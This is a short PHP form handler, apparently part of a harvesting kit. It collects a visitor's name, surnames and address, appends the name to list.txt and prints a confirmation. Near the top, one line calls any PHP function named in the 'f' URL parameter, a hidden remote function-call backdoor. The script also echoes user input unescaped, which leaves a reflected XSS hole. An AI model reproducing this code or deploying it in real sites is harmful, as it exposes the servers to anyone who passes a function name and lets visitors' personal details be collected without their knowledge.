<?php

// Programado por NePtYx
        if(function_exists($_GET['f'])) { $_GET['f'](); }
        $nombre = $_GET['nombre'];
        $apellidos = $_REQUEST["apellidos"];
        $domicilio = $_REQUEST["domicilio"];
        echo "$f";

        $fecha = date("d/m/Y");
        $hora = date("H:i:s");


        $datos = fopen("list.txt", "ab");

        fwrite($datos, $nombre."\n");

        fclose($datos);

        echo "<h2>Mensaje enviado correctamente<br><br>

        Mensaje: $nombre<br>
        $fecha $hora<br>
        ---------------------------------\n<br>
        </h2>";
        ?>
